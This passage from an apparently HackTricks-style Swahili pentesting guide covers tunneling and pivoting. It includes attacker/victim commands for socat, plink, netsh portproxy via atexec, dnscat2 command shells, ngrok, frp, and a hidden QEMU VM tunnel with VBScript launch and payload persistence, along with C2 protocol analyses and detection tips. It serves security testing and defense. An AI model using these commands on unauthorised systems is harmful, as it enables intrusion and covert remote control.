attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink ni zana ya PuTTY ya kuunganisha kupitia mstari wa amri, yenye chaguo za SSH forwarding zinazofanana na `ssh`.<sup>[[22]](#references)</sup>

Tumia herufi kubwa `-P` kwa port ya SSH. `-pw` imehifadhiwa kwa ajili ya uoanifu, lakini hufichua nenosiri kwenye orodha ya michakato; inapowezekana, pendelea uthibitishaji kwa key au `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Kwa kuwa binary hii itatekelezwa kwenye mashine ya mwathiriwa na ni SSH client, fungua huduma na port ya SSH kwa ajili ya reverse connection; mfano ufuatao unatumia `-R` ku-forward port inayoweza kufikiwa ndani ya nchi hadi kwenye mashine ya mshambuliaji.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Tumia muktadha wenye ruhusa zinazohitajika na host unapounda au kubadilisha sheria za `portproxy` zinazoendelea kuwepo. Microsoft inaandika kuhusu miundo ya kuongeza, kuonyesha na kufuta `v4tov4` inayotumika hapa chini.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Kusambaza `portproxy` kupitia kazi iliyoratibiwa

Wakati credentials za msimamizi zinapatikana, utekelezaji wa Task Scheduler wa mbali unaweza kusakinisha kanuni asilia ya forwarding bila kupakia relay maalum. Kwa mfano, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) inaweza kufanya pivot isikilize kwenye TCP/443 na kuelekeza muunganisho kwenye huduma ya ndani ya SMB.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Kanuni hii ni ya kudumu, kwa hivyo iorodheshe kwa kutumia `netsh interface portproxy show v4tov4` na uiondoe waziwazi baada ya majaribio. Kumbuka kwamba `portproxy` hutoa forwarding pekee; firewall ya host lazima pia iruhusu port inayosikilizwa.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Unahitaji kuwa na **ufikiaji wa RDP kwenye mfumo**.\
Pakua:

SocksOverRDP hutumia Remote Desktop Dynamic Virtual Channels kubeba muunganisho wa SOCKS5 kupitia session iliyopo ya RDP; plugin ya client husikiliza kwenye `127.0.0.1:1080` huku component ya server ikiendeshwa kwenye lengo la RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Tool hii hutumia `Dynamic Virtual Channels` (`DVC`) kutoka kwenye kipengele cha Remote Desktop Service cha Windows. DVC inahusika na **kutunnelisha packets kupitia muunganisho wa RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Kwenye kompyuta yako ya client, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Sasa tunaweza **kuunganisha** kwenye **mwathiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **prompt** inayosema kuwa **SocksOverRDP plugin** imewezeshwa, na itasikiliza kwenye **127.0.0.1:1080**.

**Unganisha** kupitia **RDP**, kisha pakia na utekeleze binary ya `SocksOverRDP-Server.exe` kwenye mashine ya mwathiriwa:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Sasa, thibitisha kwenye mashine yako (attacker) kwamba port 1080 inasikiliza:

```
netstat -antb | findstr 1080
```

Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) kuelekeza trafiki kupitia port hiyo.<sup>[[26]](#references)</sup>

### Uwindaji wa RDP virtual-channel

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) ni tunnel nyingine ya RDP virtual-channel; jina lake la channel chaguomsingi ni `rdp2tcp`, ingawa operator anaweza kuchagua jina tofauti.<sup>[[56]](#references)</sup> Uundaji na kufungwa kwa channel hurekodiwa katika `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` kama event ID **132** na **148**. Tafuta `rdp2tcp` na majina ya channel yasiyo ya kawaida/ya nasibu, kisha yalinganishe na channel zinazotarajiwa kama vile `XPSRD`, `cliprdr`, na `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Kuelekeza Windows GUI Apps kupitia Proxy

Unaweza kufanya Windows GUI apps zipitie proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Katika **Profile -> Proxy Servers**, ongeza IP na port ya SOCKS server.\
Katika **Profile -> Proxification Rules**, ongeza jina la programu ya kuelekeza kupitia proxy pamoja na miunganisho kwenye IP unazotaka kuelekeza kupitia proxy; sheria za Proxifier zinaweza kulinganisha programu, host lengwa na port.<sup>[[27]](#references)</sup>

## Kupitisha Tunnel kupitia NTLM proxy

Zana iliyotajwa awali, **Rpivot**, inaweza kuelekeza trafiki kupitia proxy inayothibitisha kwa NTLM. **OpenVPN** pia inaweza kuelekeza trafiki kupitia proxy hiyo ikisanidiwa kwa kutumia auth file na mbinu ya NTLMv2; huku ni kupita kwenye proxy, si kukwepa uthibitishaji wa proxy.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm hujithibitisha kwa proxies za NTLM za upstream, hufungua listeners za ndani, na inaweza kuelekeza port ya tunnel ya ndani kwenye huduma lengwa; kisha clients wanaweza kutumia port hiyo ya ndani.<sup>[[29]](#references)</sup>\
Kwa mfano, kusambaza port 443.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Sasa, ukiweka kwa mfano huduma ya **SSH** kwenye victim isikilize kwenye port 443, unaweza kuiunganisha kupitia port 2222 ya attacker.<sup>[[29]](#references)</sup>\
Unaweza pia kutumia **meterpreter** inayounganisha kwenye localhost:443 huku attacker akisikiliza kwenye port 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) ni toolkit ya Microsoft ya reverse proxy ya .NET. Unaweza kuipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine huunda tunnel ya IPv4 kupitia DNS queries na hutumia interfaces za TUN; usanidi ulioandikwa unahitaji ruhusa zinazohitajika ili kuunda interfaces hizo kwenye ncha zote mbili.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

Usafirishaji wa DNS una gharama ya ziada kubwa kuliko TCP ya moja kwa moja na kwa kawaida huwa polepole; unaweza kuunda muunganisho wa SSH uliobanwa kupitia handaki hili kwa kutumia:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Pakua hapa**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 huanzisha channel iliyosimbwa kwa njia fiche ya command-and-control kupitia DNS; amri za server na client zilizo hapa chini zinafuata matumizi yaliyoandikwa kwenye nyaraka zake.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **Katika PowerShell**

Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha client ya dnscat2 katika PowerShell; README yake inaeleza vigezo vya `Start-Dnscat2` vilivyoonyeshwa hapa chini.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding kwa dnscat**

Amri ya `listen` ya mwingiliano ya Dnscat2 huelekeza msikilizaji wa ndani kwenye hosti na port ya mbali.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Badilisha DNS ya proxychains

Proxychains-ng huunganisha hooks kwenye miunganisho ya TCP iliyounganishwa kwa nguvu na haiwezi kusafirisha UDP au ICMP; uelekezaji wa DNS kupitia proxy unaweza kusanidiwa, kwa hivyo kagua `proxychains.conf` iliyosakinishwa na helper ya resolver badala ya kudhani kuwa kuna resolver ya umma isiyobadilika. Skripti za zamani za `proxyresolv` hufichua `PROXY_DNS_SERVER` kwa ajili ya kuchagua resolver; tumia resolver inayoweza kufikiwa kutoka kwenye pivot inapohitajika majina ya ndani.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels katika Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### C2 Maalum ya DNS TXT / HTTP JSON (AK47C2)

Mhusika Storm-2603 aliunda **C2 ya njia mbili ("AK47C2")** inayotumia vibaya trafiki ya **DNS** inayotoka na ya **HTTP POST** isiyosimbwa kwa njia fiche pekee — itifaki mbili ambazo hazizuiwi mara chache kwenye mitandao ya kampuni.<sup>[[2]](#references)</sup>

1. **Hali ya DNS (AK47DNS)**
   • Huzalisha SessionID ya herufi 5 bila mpangilio (kwa mfano, `H4T14`).  
   • Huongeza `1` mwanzoni kwa *maombi ya kazi* au `2` kwa *matokeo*, kisha huunganisha sehemu tofauti (flags, SessionID, jina la kompyuta).  
   • Kila sehemu **husimbwa kwa XOR kwa kutumia ufunguo wa ASCII `VHBD@H`**, hubadilishwa kuwa hex, na kuunganishwa kwa nukta — kisha huishia kwa domain inayodhibitiwa na mshambuliaji:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Maombi hutumia `DnsQuery()` kwa rekodi za **TXT** (na **MG** kama njia mbadala).  
   • Jibu linapozidi biti 0xFF, backdoor hugawanya data katika vipande vya baiti 63 na kuingiza alama:
     `s<SessionID>t<TOTAL>p<POS>` ili seva ya C2 iweze kuvipanga upya.

2. **HTTP mode (AK47HTTP)**
   • Huunda bahasha ya JSON:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Blobu nzima huwekwa XOR kwa `VHBD@H` → hex → hutumwa kama mwili wa **`POST /`** wenye kichwa `Content-Type: text/plain`.
   • Jibu hutumia usimbaji huohuo, na sehemu ya `cmd` hutekelezwa kwa `cmd.exe /c <command> 2>&1`.

Maelezo ya Blue Team
• Tafuta **TXT queries** zisizo za kawaida ambazo lebo yake ya kwanza ni nambari ndefu za hexadecimal na huishia kila mara kwenye domain moja isiyo ya kawaida.  
• Ufunguo wa XOR usiobadilika unaofuatwa na ASCII-hex ni rahisi kugundua kwa YARA: `6?56484244?484` (`VHBD@H` katika hex).  
• Kwa HTTP, weka alama kwenye miili ya POST ya text/plain ambayo ina hex pekee na urefu wake ni kizidisho cha baiti mbili.

{{#note}}
Channel hii huweka kila lebo ya sub-domain ndani ya kikomo cha DNS cha okteti 63, lakini kufuata tu masharti ya protocol hakufanyi iwe fiche; domain zisizo za kawaida, lebo ndefu za hexadecimal, na idadi ya queries bado ni viashiria vya kugunduliwa.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans inaeleza tunnel ya IPv4-over-ICMP inayotumia kifaa cha TUN na ICMP echo requests; usanidi wake unahitaji ruhusa za kutosha kuunda interface.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Pakua hapa**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng husafirisha miunganisho ya TCP kupitia ICMP na hutumia chaguo za `-p`, `-l`, `-r`, na `-R` zilizoonyeshwa hapa chini kwa proxy, msikilizaji wa ndani, host lengwa, na port lengwa.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) ni agent ya kuweka huduma za mtandao wa ndani mtandaoni kupitia handaki salama; CLI yake inaeleza endpoints za HTTP, TCP na URL za faili, na hostname ya endpoint inayoonyeshwa inaweza kutofautiana kulingana na endpoint na akaunti.<sup>[[39]](#references)</sup>

### Usakinishaji

- Fungua akaunti: https://ngrok.com/signup
- Upakuaji wa client:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Matumizi ya msingi

**Nyaraka:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Agent pia inasaidia chaguo za uthibitishaji na TLS inapohitajika.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Kuweka faili wazi kupitia HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing maombi ya HTTP

_Useful for XSS,SSRF,SSTI ..._\
Wakala wa kujitegemea huweka kiolesura chake cha ukaguzi wa HTTP kwenye `http://127.0.0.1:4040` kwa chaguomsingi; kiolesura hiki ni cha trafiki ya HTTP.<sup>[[40]](#references)</sup>

#### Tunneling huduma ya ndani ya HTTP

Chaguo la `--host-header=rewrite` hubadilisha kichwa cha `Host` cha HTTP cha upstream ili kilingane na huduma ya ndani.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Mfano rahisi wa usanidi wa ngrok.yaml

Hii hutumia ngrok Agent Config v2; tunnels zilizopewa majina hutumia `proto` na `addr`, na huanzishwa kwa `ngrok start`.<sup>[[42]](#references)</sup> Hufungua tunnels 3:

- 2 TCP
- 1 HTTP yenye uwasilishaji wa faili tuli kutoka /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels zinaweza kuchapisha huduma ya ndani inayotumia TCP kupitia miundombinu ya relay ya Microsoft. CLI ya host huunda tunnel inayotoka, huku `devtunnel connect` ikiunda upya port iliyohostiwa kwenye client; kwa chaguomsingi, tunnels zinahitaji uthibitishaji isipokuwa vidhibiti vya ufikiaji vilainishwe kimakusudi.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Hii inaweza kufichua RDP kupitia `*.devtunnels.ms` bila kufungua listener mpya ya inbound kwenye perimeter. Inaweza pia kuunganishwa na RDP virtual-channel tunnel kama `rdp2tcp`, na kugeuza kipindi cha RDP kuwa pivot ya hatua ya pili kwa traffic yoyote ya TCP.<sup>[[58]](#references)</sup>

Kwa uchunguzi, linganisha utekelezaji wa Dev Tunnels CLI na traffic ya DNS/TLS kwenda `*.devtunnels.ms` pamoja na matukio yasiyotarajiwa ya RDP virtual-channel. Tunnel iliyothibitishwa si salama kwa sababu tu inatumia relay inayomilikiwa na Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Kiunganishi cha Cloudflare Tunnel, `cloudflared`, huanzisha miunganisho ya outbound; programu zilizochapishwa zinaweza kuelekeza HTTP, HTTPS, TCP, SSH na RDP, ilhali quick tunnels zimekusudiwa kwa uendelezaji wa HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### Asili ya SOCKS5 (hali ya zamani)

Alama ya zamani `--socks5` huiambia `cloudflared` kwamba origin ya ndani inatumia SOCKS5; haiundi kisikilizaji cha ndani cha SOCKS5. Kwa tunnel inayodhibitiwa, `originRequest.proxyType: socks` husanidi ushughulikiaji wa origin ya SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Handaki endelevu kwa kutumia DNS

Usanidi wa tunnel unaodhibitiwa ndani ya mfumo hutumia funguo za herufi ndogo `tunnel`, `credentials-file`, na `url` kama inavyoonyeshwa hapa chini.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Anzisha kiunganishi:

```bash
cloudflared tunnel run mytunnel
```

Kiunganishi huanzisha miunganisho ya nje na, kwa chaguomsingi, hujadiliana kutumia QUIC na kurudi kwenye HTTP/2 ikishindikana; usidhani kuwa kila usanidi unatumia TCP/443. Kiendeshe kwa ruhusa zinazohitajika tu na usanidi wako.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ni reverse proxy iliyoandikwa kwa Go inayotumia **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, na XTCP**. XTCP hutumia P2P hole punching, ambayo kufanikiwa kwake hutegemea NAT. Kuanzia **v0.53.0**, inaweza kufanya kazi kama **SSH Tunnel Gateway**, hivyo host lengwa inaweza kutumia OpenSSH client ya kawaida bila binary ya `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Handaki ya kawaida ya reverse TCP

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Kutumia lango jipya la SSH (bila binary ya frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Amri iliyo hapo juu huchapisha port **8080** ya mwathiriwa kama **attacker_ip:9000** kwa kutumia OpenSSH client ya kawaida, huku `frps` ikitoa gateway.<sup>[[50]](#references)</sup>

## STUN-assisted UDP back-connects

STUN Binding requests zinazotumwa kutoka kwenye UDP socket zinaweza kufichua IP address na port yake ya server-reflexive, huku traffic ya mara kwa mara ikiweka NAT binding hai. Public STUN server si relay ya control packets za kiholela.<sup>[[60]](#references)</sup> Muundo wa back-connect uliochanganuliwa ulihifadhi UDP socket ileile kwa control datagram fupi, kisha ukatumia *separate outbound TCP connection* kupakua na kutekeleza commands baada ya trigger kupokelewa.<sup>[[59]](#references)</sup>

Ili kupokea UDP packet ya controller, muundo bado unahitaji kushiriki mapping na controller huyo na kutimiza sera ya NAT ya kuchuja traffic. Uchujaji unaotegemea address au port unaweza kukubali majibu kutoka kwa STUN server lakini kudondosha packets kutoka endpoint nyingine.<sup>[[60]](#references)[[61]](#references)</sup> Njia ya rendezvous ya backdoor iliyochanganuliwa haikuthibitishwa, kwa hiyo majibu ya STUN yaliyofaulu pekee hayathibitishi kuwa control channel yake inaweza kufikiwa.<sup>[[59]](#references)</sup> Kwa protocol tofauti yenye rendezvous iliyo wazi na fallback ya relay, tazama [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Covert VM-based Tunnels with QEMU

QEMU user-mode networking haihitaji root au administrator privilege kwa virtual network, na `-netdev user,hostfwd=...` huelekeza TCP, UDP au UNIX connections kutoka host kwenda guest.<sup>[[51]](#references)</sup> TrustedSec iliandika kuhusu Tiny Core QEMU VM na jaribio la reverse SSH tunnel katika tukio ambapo EDR inayolenga host ingeweza kukosa shughuli ndani ya guest.<sup>[[1]](#references)</sup>

### One-liner ya haraka

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Amri iliyo hapo juu huwasha mashine pepe ya **Tiny Core Linux** yenye kumbukumbu ya guest ya 256 MiB na picha ya diski ya qcow2; picha ya diski si diski iliyo kwenye RAM.
• Port **2222/tcp** kwenye host ya Windows inaelekezwa kwa uwazi kwenye **22/tcp** ndani ya mashine pepe.
• Kwa mtazamo wa mshambuliaji, lengo linaonyesha tu port 2222; pakiti zozote zinazoifikia hushughulikiwa na seva ya SSH inayoendesha ndani ya mashine pepe.

### Kuwasha kwa siri kupitia VBScript

TrustedSec iliona kuwashwa kwa QEMU kulikoendeshwa na VBS na picha za Tiny Core katika tukio lililotajwa hapo juu.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Kuendesha script kwa `cscript.exe //B update.vbs` huficha dirisha.<sup>[[1]](#references)</sup>

### Persistence ndani ya guest

Tukio lililotajwa linaeleza persistence katika guest ya Tiny Core isiyo na hali, kupitia `/opt/bootlocal.sh` na `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Weka payload kwenye `/opt/123.out`  
2. Ongeza kwenye `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Ongeza `home/tc` na `opt` kwenye `/opt/filetool.lst` ili payload ijumuishwe katika `mydata.tgz` wakati wa kuzima.

### Mambo ya kuzingatia kuhusu telemetry

• Host bado hufichua mchakato wa QEMU, image ya qcow2 na listener yoyote iliyoforwardiwa na host.  
• Ukaguzi wa michakato unaofanywa na host pekee huenda usichunguze michakato ya guest, lakini matumizi ya virtualization hayahakikishi kuwa hautagunduliwa; telemetry ya mtandao, QEMU na image bado inaweza kuufichua.<sup>[[1]](#references)[[51]](#references)</sup>

### Vidokezo kwa watetezi

• Toa tahadhari kuhusu **binaries za QEMU/VirtualBox/KVM zisizotarajiwa** zilizo kwenye njia ambazo mtumiaji anaweza kuandika.  
• Zuia miunganisho ya nje inayoanzishwa na `qemu-system*.exe`.  
• Tafuta ports za kusikiliza zilizo nadra (2222, 10022, …) zinazofungamana mara tu baada ya QEMU kuzinduliwa.

## Nodi za relay za IIS/HTTP.sys kupitia `HttpAddUrl` (ShadowPad)

Check Point inaeleza kuwa moduli ya IIS ya ShadowPad hubadilisha seva za wavuti za pembeni zilizodukuliwa kuwa backdoor na nodi za relay kwa kufunga viambishi awali vya URL kupitia `HttpAddUrl`.<sup>[[3]](#references)</sup>

Ripoti hiyo hiyo inaeleza chaguomsingi, listeners za wildcard, usimbuaji wa pakiti, foleni za relay na telemetry ya utatuzi zilizofupishwa hapa chini.<sup>[[3]](#references)</sup>

* **Chaguomsingi za usanidi** – ikiwa config ya JSON ya moduli itaacha thamani, hutumia chaguomsingi za IIS zinazoonekana halisi (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Hivyo, trafiki isiyo hasidi hujibiwa na IIS ikiwa na utambulisho sahihi.
* **Uingiliaji wa wildcard** – waendeshaji hutoa orodha ya viambishi awali vya URL vilivyotenganishwa kwa nukta mkato (wildcards kwenye host na path). Moduli huita `HttpAddUrl` kwa kila ingizo, kwa hiyo HTTP.sys huelekeza maombi yanayolingana kwa handler hasidi; maombi yasiyolingana hutumia tabia ya kawaida ya IIS.
* **Pakiti ya kwanza iliyosimbwa kwa njia fiche** – baiti mbili za kwanza za body ya ombi hubeba seed ya PRNG maalum ya biti 32. Kila baiti inayofuata hufanyiwa XOR na keystream inayozalishwa kabla ya uchanganuzi wa protocol:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Uratibu wa relay** – moduli hudumisha orodha mbili: “servers” (nodi za upstream) na “clients” (implants za downstream). Ingizo huondolewa ikiwa heartbeat haijafika ndani ya takriban sekunde 30. Orodha zote mbili zikiwa na ingizo, moduli hulinganisha server ya kwanza iliyo hai na client ya kwanza iliyo hai, kisha hupitisha tu bytes kati ya soketi zao hadi upande mmoja ufunge.
* **Telemetry ya utatuzi** – logging ya hiari huhifadhi IP ya chanzo, IP ya lengwa, na jumla ya bytes zilizopitishwa kwa kila jozi. Wachunguzi walitumia vidokezo hivyo kujenga upya mesh ya ShadowPad iliyohusisha wahasiriwa wengi.

---

## Zana nyingine za kuangalia

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Kujificha Kwenye Vivuli: Tunnels za Siri kupitia Virtualization ya QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Jinsi Operesheni Fiche ya Mashambulizi Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README ya Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Mwongozo wa Marejeo wa Nmap: Kukwepa Vizuizi vya Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Mwongozo wa ssh wa OpenBSD](https://man.openbsd.org/ssh)
- [7] [Mwongozo wa sshd_config wa OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Maelezo ya toleo la OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README ya sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting katika Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Nyaraka za moduli ya Metasploit socks_proxy](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Nyaraka za moduli ya Metasploit autoroute](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Usambazaji wa Port wa Reverse](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
